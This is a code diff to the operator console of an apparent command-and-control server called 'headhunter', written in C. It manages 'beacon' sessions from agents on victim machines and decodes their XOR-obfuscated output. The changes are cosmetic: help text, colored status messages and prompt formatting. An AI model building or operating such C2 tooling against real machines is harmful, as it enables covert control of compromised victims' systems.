@@ -48,7 +48,7 @@ int server_control_session(){
             printf("> help                   |  List all available commands\n");
             printf("> show sessions          |  List active connections\n");
             printf("> use <session id>       |  Switch session to specified connection by id\n");
-	    printf("> kill <session id>      |  Kill socket connection to Agent\n");
+	    printf("> kill <session id>      |  Task agent to die and close connection by id\n");
             printf("> exit                   |  Close headhunter\n\n");
         } else if (strcmp(newline_terminator(buffer), "show sessions\n") == 0 || strcmp(newline_terminator(buffer), "show connections\n") == 0 || strcmp(newline_terminator(buffer), "show\n") == 0 || strcmp(newline_terminator(buffer), "show \n") == 0) {
             printf("\nID          Address                  Status \n--------------------------------------------------------------\n");
@@ -180,9 +180,13 @@ void *Socket_Reader(){
 
 		free(xorbuffer);
 		continue;
-	}
+	    }
 
-	if(a.kill == 0){printf("beacon> ");}
+	printf("\e[1;32m[+]\e[0m Received %li bytes\n", strlen(xorbuffer));
+
+	if(a.kill == 0){
+		printf("beacon> ");
+	}
 
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
@@ -364,7 +368,7 @@ void *Acceptor(){
                 send(client_socket[i], xorresponse, strlen(response), 0);
 				*arg = client_socket[i];
 
-                        	printf("\nBeacon received from %s\n", get_socket_addr(new_socket));
+                        	printf("\n\e[1;32m[+]\e[0m Beacon received from %s\n", get_socket_addr(new_socket));
                         	printf("Press enter or type a command to resume previous session\n\n");
 			}
 
